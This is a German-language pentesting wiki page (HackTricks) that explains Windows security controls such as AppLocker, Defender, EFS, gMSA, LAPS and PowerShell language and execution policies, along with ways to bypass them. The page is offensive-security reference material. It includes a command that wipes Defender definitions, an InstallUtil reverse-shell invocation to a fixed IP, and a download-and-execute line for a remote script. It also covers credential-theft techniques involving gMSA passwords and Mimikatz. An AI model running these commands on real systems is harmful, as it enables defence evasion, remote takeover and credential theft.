# Windows-Sicherheitskontrollen

{{#include ../banners/hacktricks-training.md}}

## AppLocker-Richtlinie

Eine application whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, deren Vorhandensein und Ausführung auf einem System erlaubt ist. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen Geschäftsanforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist die **application whitelisting solution** von Microsoft und gibt Systemadministratoren Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Sie ermöglicht eine **granulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installer-Dateien, DLLs, paketierte Apps und Installationsprogramme für paketierte Apps.\
Es ist üblich, dass Organisationen **cmd.exe und PowerShell.exe blockieren** und den Schreibzugriff auf bestimmte Verzeichnisse einschränken, **aber all dies kann umgangen werden**.

### Überprüfen

Überprüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registrierungspfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und bietet eine Möglichkeit, die aktuell auf dem System durchgesetzten Regeln zu überprüfen:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **beschreibbare Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker die Ausführung beliebiger Dateien innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die du verwenden kannst, um dies zu **umgehen**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Häufig **vertrauenswürdige** [**„LOLBAS“**](https://lolbas-project.github.io/) Binaries können ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln können ebenfalls umgangen werden.**
- Wenn beispielsweise **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** verwendet wird, können Sie überall einen **Ordner namens `allowed`** erstellen, und er wird zugelassen.
- Organisationen konzentrieren sich außerdem häufig darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu **blockieren**, vergessen aber die **anderen** [**Speicherorte der PowerShell-Executables**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **Die DLL-Durchsetzung ist aufgrund der zusätzlichen Belastung, die sie für ein System darstellen kann, und des erforderlichen Testaufwands, um sicherzustellen, dass nichts beschädigt wird, nur sehr selten aktiviert.** Daher kann die Verwendung von **DLLs als Backdoors dazu beitragen, AppLocker zu umgehen**.
- Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess **auszuführen** und AppLocker zu umgehen. Weitere Informationen finden Sie unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Speicherung von Credentials

### Security Accounts Manager (SAM)

Lokale Credentials befinden sich in dieser Datei; die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Credentials** (gehasht) werden aus Gründen des Single Sign-On im **Speicher** dieses Subsystems **gespeichert**.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen ...), die **Authentifizierung**, **Zugriffstoken** ...\
LSA ist dafür zuständig, die bereitgestellten Credentials in der **SAM**-Datei (bei einer lokalen Anmeldung) zu **überprüfen** und mit dem **Domain Controller** zu **kommunizieren**, um einen Domain-Benutzer zu authentifizieren.

Die **Credentials** werden im **Prozess LSASS** **gespeichert**: Kerberos-Tickets, NT- und LM-Hashes sowie leicht entschlüsselbare Passwörter.

### LSA secrets

LSA kann einige Credentials auf der Festplatte speichern:

- Passwort des Computerkontos von Active Directory (nicht erreichbarer Domain Controller).
- Passwörter der Konten von Windows-Diensten
- Passwörter für geplante Tasks
- Weitere (Passwort von IIS-Anwendungen ...)

### NTDS.dit

Dabei handelt es sich um die Datenbank von Active Directory. Sie ist nur auf Domain Controllern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirusprogramm, das in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Es **blockiert** gängige pentesting Tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, diese **Schutzmaßnahmen zu umgehen**.

### Überprüfung

Um den **Status** von **Defender** zu überprüfen, können Sie das PS-Cmdlet **`Get-MpComputerStatus`** ausführen (überprüfen Sie den Wert von **`RealTimeProtectionEnabled`**, um festzustellen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Zur Enumeration können Sie ebenfalls Folgendes ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Verschlüsseltes Dateisystem (EFS)

EFS schützt Dateien durch Verschlüsselung und verwendet dabei einen **symmetrischen Schlüssel**, der als **File Encryption Key (FEK)** bezeichnet wird. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstream** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Stream zu entschlüsseln. Weitere Details finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Szenarien für eine Entschlüsselung ohne Benutzerinitiierung** umfassen:

- Wenn Dateien oder Ordner in ein Nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) verschoben werden, werden sie automatisch entschlüsselt.
- Verschlüsselte Dateien, die über das Netzwerk mit dem SMB/CIFS-Protokoll gesendet werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer einen **transparenten Zugriff** auf verschlüsselte Dateien. Das einfache Ändern des Passworts des Besitzers und anschließende Anmelden ermöglicht jedoch keine Entschlüsselung.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Für die Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
- Unter bestimmten Bedingungen erfolgt eine automatische Entschlüsselung, beispielsweise beim Kopieren nach FAT32 oder bei der Netzwerkübertragung.
- Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.

### EFS-Informationen überprüfen

Überprüfen Sie, ob ein **Benutzer** diesen **Dienst** **verwendet**, indem Sie prüfen, ob dieser Pfad existiert:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Überprüfen Sie mit cipher /c \<file>\, **wer** Zugriff auf die Datei hat.\
Sie können auch `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** bzw. zu **entschlüsseln**.

### EFS-Dateien entschlüsseln

#### Als Authority System

Dieser Ansatz erfordert, dass der **Opferbenutzer** einen **Prozess** auf dem Host **ausführt**. Falls dies zutrifft, können Sie aus einer `meterpreter`-Sitzung das Prozesstoken des Benutzers impersonieren (`impersonate_token` aus `incognito`). Alternativ können Sie in den Prozess des Benutzers `migrate`.

#### Das Passwort des Benutzers kennen

Mimikatz kann das Zertifikat und den privaten Schlüssel des Benutzers importieren und anschließend verwenden, um durch EFS geschützte Dateien zu entschlüsseln.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Service Accounts in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Service Accounts, bei denen häufig die Einstellung "**Password never expire**" aktiviert ist, bieten gMSAs eine sicherere und besser verwaltbare Lösung:

- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes Passwort mit 240 Zeichen, das sich entsprechend der Domain- oder Computerrichtlinie automatisch ändert. Dieser Prozess wird vom Key Distribution Service (KDC) von Microsoft verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
- **Erhöhte Sicherheit**: Diese Accounts sind gegen Lockouts geschützt und können nicht für interaktive Anmeldungen verwendet werden, wodurch ihre Sicherheit erhöht wird.
- **Unterstützung mehrerer Hosts**: gMSAs können auf mehreren Hosts gemeinsam verwendet werden und eignen sich daher ideal für Services, die auf mehreren Servern ausgeführt werden.
- **Unterstützung geplanter Tasks**: Im Gegensatz zu Managed Service Accounts unterstützen gMSAs die Ausführung geplanter Tasks.
- **Vereinfachte SPN-Verwaltung**: Das System aktualisiert den Service Principal Name (SPN) automatisch, wenn sich die sAMaccount-Details oder der DNS-Name des Computers ändern, wodurch die SPN-Verwaltung vereinfacht wird.

Die Passwörter von gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und alle 30 Tage automatisch von Domain Controllern (DCs) zurückgesetzt. Dieses Passwort, ein verschlüsselter Datenblob namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern abgerufen werden, auf denen die gMSAs installiert sind, wodurch eine sichere Umgebung gewährleistet wird. Für den Zugriff auf diese Informationen ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit „Sealing & Secure“ authentifiziert sein.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Sie können dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** auslesen.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Weitere Informationen in diesem Beitrag**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Siehe auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) darüber, wie ein **NTLM relay attack** durchgeführt wird, um das **Passwort** von **gMSA** zu **lesen**.<sup>[[3]](#references)</sup>

## LAPS

Die **Local Administrator Password Solution (LAPS)**, die bei [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) zum Download verfügbar ist, ermöglicht die Verwaltung lokaler Administratorpasswörter. Diese **randomisierten**, eindeutigen und **regelmäßig geänderten** Passwörter werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter wird durch ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen wird die Möglichkeit bereitgestellt, lokale Administratorpasswörter zu lesen.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Der PowerShell-[**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der für eine effektive Nutzung von PowerShell erforderlichen Funktionen ein**, beispielsweise durch die Blockierung von COM-Objekten, die Beschränkung auf genehmigte .NET-Typen, XAML-basierte Workflows, PowerShell-Klassen und mehr.

### **Prüfen**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In aktuellen Windows-Versionen wird dieser Bypass nicht funktionieren, aber du kannst [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren musst du möglicherweise** **eine Referenz hinzufügen** -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Du kannst [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **Powershell**-Code in jedem Prozess **auszuführen** und den eingeschränkten Modus zu umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** gesetzt. Die wichtigsten Möglichkeiten, diese Richtlinie zu umgehen:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mehr dazu finden Sie [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Dies ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür zuständig, das geeignete Protokoll für zwei Computer zu finden, die miteinander kommunizieren möchten. Die bevorzugte Methode hierfür ist Kerberos. Anschließend handelt die SSPI aus, welches Authentication Protocol verwendet wird. Diese Authentication Protocols werden Security Support Provider (SSP) genannt, befinden sich in Form einer DLL auf jedem Windows-Computer, und beide Computer müssen dasselbe unterstützen, um kommunizieren zu können.

### Wichtige SSPs

- **Kerberos**: Das bevorzugte
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
- %windir%\Windows\System32\lsasrv.dll

#### Die Aushandlung kann mehrere Methoden oder nur eine anbieten.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktivitäten mit erhöhten Rechten** ermöglicht.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Umgehen von AppLocker und dem eingeschränkten PowerShell-Sprachmodus](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [Anleitung ~ EFS-Dateien entschlüsseln](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying für gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Möglichkeiten zum Umgehen der PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
